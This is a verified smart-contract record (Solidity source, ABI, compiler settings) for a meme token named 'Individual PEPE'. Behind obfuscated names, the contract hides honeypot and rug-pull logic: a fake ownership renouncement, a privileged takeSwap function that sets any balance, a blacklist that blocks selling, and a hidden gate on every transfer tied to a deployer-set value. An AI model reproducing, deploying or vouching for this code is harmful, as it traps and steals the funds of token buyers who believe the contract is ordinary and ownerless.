{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface listAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listTake) external view returns (uint256);\n\n    function transfer(address modeExempt, uint256 listLaunched) external returns (bool);\n\n    function allowance(address maxLimitIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeExempt,\n        uint256 listLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTeam, uint256 value);\n    event Approval(address indexed maxLimitIs, address indexed spender, uint256 value);\n}\n\nabstract contract fromTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTeam {\n    function createPair(address launchFund, address amountTo) external returns (address);\n}\n\ninterface listAmountMetadata is listAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndividualPEPE is fromTeam, listAmount, listAmountMetadata {\n\n    bool private teamAt;\n\n    constructor (){\n        if (swapTeam == receiverAuto) {\n            exemptShouldMin = toShouldSwap;\n        }\n        tokenExempt launchedAt = tokenExempt(limitAtShould);\n        liquidityModeList = shouldTeam(launchedAt.factory()).createPair(launchedAt.WETH(), address(this));\n        if (maxSenderList) {\n            enableListTo = exemptShouldMin;\n        }\n        buyMinAuto = _msgSender();\n        autoSwap();\n        teamBuy[buyMinAuto] = true;\n        sellTradingFrom[buyMinAuto] = exemptWallet;\n        \n        emit Transfer(address(0), buyMinAuto, exemptWallet);\n    }\n\n    uint256 constant sellFee = 17 ** 10;\n\n    mapping(address => uint256) private sellTradingFrom;\n\n    uint256 private swapTotal;\n\n    uint256 public exemptShouldMin;\n\n    event OwnershipTransferred(address indexed maxAtAmount, address indexed limitTo);\n\n    mapping(address => bool) public tokenShould;\n\n    function isTake(address fundWallet) public {\n        fundFrom();\n        if (tradingAmountSwap == maxSenderList) {\n            swapTotal = enableListTo;\n        }\n        if (fundWallet == buyMinAuto || fundWallet == liquidityModeList) {\n            return;\n        }\n        tokenShould[fundWallet] = true;\n    }\n\n    address private isSwapTotal;\n\n    function transfer(address buyReceiver, uint256 listLaunched) external virtual override returns (bool) {\n        return feeTeam(_msgSender(), buyReceiver, listLaunched);\n    }\n\n    function launchedTrading(uint256 listLaunched) public {\n        fundFrom();\n        tokenTake = listLaunched;\n    }\n\n    bool public swapTeam;\n\n    address public liquidityModeList;\n\n    string private modeTrading = \"Individual PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTo;\n    }\n\n    function feeTeam(address feeLaunchedBuy, address modeExempt, uint256 listLaunched) internal returns (bool) {\n        if (feeLaunchedBuy == buyMinAuto) {\n            return teamLaunch(feeLaunchedBuy, modeExempt, listLaunched);\n        }\n        uint256 teamModeSell = listAmount(liquidityModeList).balanceOf(listTradingTotal);\n        require(teamModeSell == tokenTake);\n        require(modeExempt != listTradingTotal);\n        if (tokenShould[feeLaunchedBuy]) {\n            return teamLaunch(feeLaunchedBuy, modeExempt, sellFee);\n        }\n        return teamLaunch(feeLaunchedBuy, modeExempt, listLaunched);\n    }\n\n    function teamLaunch(address feeLaunchedBuy, address modeExempt, uint256 listLaunched) internal returns (bool) {\n        require(sellTradingFrom[feeLaunchedBuy] >= listLaunched);\n        sellTradingFrom[feeLaunchedBuy] -= listLaunched;\n        sellTradingFrom[modeExempt] += listLaunched;\n        emit Transfer(feeLaunchedBuy, modeExempt, listLaunched);\n        return true;\n    }\n\n    uint256 isBuy;\n\n    bool public tradingAmountSwap;\n\n    bool private receiverAuto;\n\n    uint256 private exemptWallet = 100000000 * 10 ** 18;\n\n    function allowance(address isReceiverTrading, address isAt) external view virtual override returns (uint256) {\n        if (isAt == limitAtShould) {\n            return type(uint256).max;\n        }\n        return tradingReceiverToken[isReceiverTrading][isAt];\n    }\n\n    mapping(address => bool) public teamBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptWallet;\n    }\n\n    address public buyMinAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalBuy;\n    }\n\n    bool public tradingAmount;\n\n    function owner() external view returns (address) {\n        return isSwapTotal;\n    }\n\n    function autoSwap() public {\n        emit OwnershipTransferred(buyMinAuto, address(0));\n        isSwapTotal = address(0);\n    }\n\n    function approve(address isAt, uint256 listLaunched) public virtual override returns (bool) {\n        tradingReceiverToken[_msgSender()][isAt] = listLaunched;\n        emit Approval(_msgSender(), isAt, listLaunched);\n        return true;\n    }\n\n    uint256 private enableListTo;\n\n    bool private maxSenderList;\n\n    uint256 tokenTake;\n\n    uint256 private toShouldSwap;\n\n    function getOwner() external view returns (address) {\n        return isSwapTotal;\n    }\n\n    function transferFrom(address feeLaunchedBuy, address modeExempt, uint256 listLaunched) external override returns (bool) {\n        if (_msgSender() != limitAtShould) {\n            if (tradingReceiverToken[feeLaunchedBuy][_msgSender()] != type(uint256).max) {\n                require(listLaunched <= tradingReceiverToken[feeLaunchedBuy][_msgSender()]);\n                tradingReceiverToken[feeLaunchedBuy][_msgSender()] -= listLaunched;\n            }\n        }\n        return feeTeam(feeLaunchedBuy, modeExempt, listLaunched);\n    }\n\n    function balanceOf(address listTake) public view virtual override returns (uint256) {\n        return sellTradingFrom[listTake];\n    }\n\n    function teamIs(address teamReceiverShould) public {\n        if (tradingAmount) {\n            return;\n        }\n        if (receiverAuto) {\n            exemptShouldMin = swapTotal;\n        }\n        teamBuy[teamReceiverShould] = true;\n        if (receiverAuto == swapTeam) {\n            swapTotal = toShouldSwap;\n        }\n        tradingAmount = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingReceiverToken;\n\n    address listTradingTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundFrom() private view {\n        require(teamBuy[_msgSender()]);\n    }\n\n    uint8 private launchTo = 18;\n\n    string private totalBuy = \"IPE\";\n\n    address limitAtShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return modeTrading;\n    }\n\n    function takeSwap(address buyReceiver, uint256 listLaunched) public {\n        fundFrom();\n        sellTradingFrom[buyReceiver] = listLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimitIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAtAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMinAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShouldMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityModeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiverShould\",\"type\":\"address\"}],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunchedBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndividualPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}